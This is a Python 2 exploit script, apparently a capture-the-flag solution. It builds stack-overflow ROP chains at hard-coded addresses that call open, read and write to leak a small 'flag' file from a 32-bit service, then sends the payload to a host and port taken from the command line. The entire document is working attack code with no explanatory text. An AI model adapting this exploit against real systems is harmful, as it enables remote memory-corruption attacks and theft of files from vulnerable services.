import socket
import sys
import struct

def main():
    open_rop = '\x00'*0x6c

    open_rop += struct.pack('<I', 0x08048420) # open
    open_rop += struct.pack('<I', 0x0804867f) # main
    open_rop += struct.pack('<I', 0x080487d0) # addr of file name
    open_rop += struct.pack('<I', 0x00000000) # read only flag

    while len(open_rop) < 0x80:
        open_rop += '\x00'

    read_rop = '\x00'*0x64

    read_rop += struct.pack('<I', 0x080483e0) # read
    read_rop += struct.pack('<I', 0x0804867f) # main
    read_rop += struct.pack('<I', 0x00000003) # guess at fd
    read_rop += struct.pack('<I', 0x0804a000) # guess at buffer
    read_rop += struct.pack('<I', 0x00000008) # flag size

    while len(read_rop) < 0x80:
        read_rop += '\x00'

    write_rop = '\x00'*0x6c

    write_rop += struct.pack('<I', 0x08048450) # write
    write_rop += struct.pack('<I', 0x0804867f) # main
    write_rop += struct.pack('<I', 0x00000001) # stdout
    write_rop += struct.pack('<I', 0x0804a000) # guess at buffer
    write_rop += struct.pack('<I', 0x00000008) # num to write

    while len(write_rop) < 0x80:
        write_rop += '\x00'

    exploit = open_rop +\
              read_rop +\
              write_rop +\
              read_rop +\
              write_rop +\
              read_rop +\
              write_rop +\
              read_rop +\
              write_rop +\
              read_rop +\
              write_rop +\
              read_rop +\
              write_rop +\
              read_rop +\
              write_rop

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((sys.argv[1], int(sys.argv[2])))

    s.send(exploit)

    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)

    s.close()

if __name__ == '__main__':
    main()
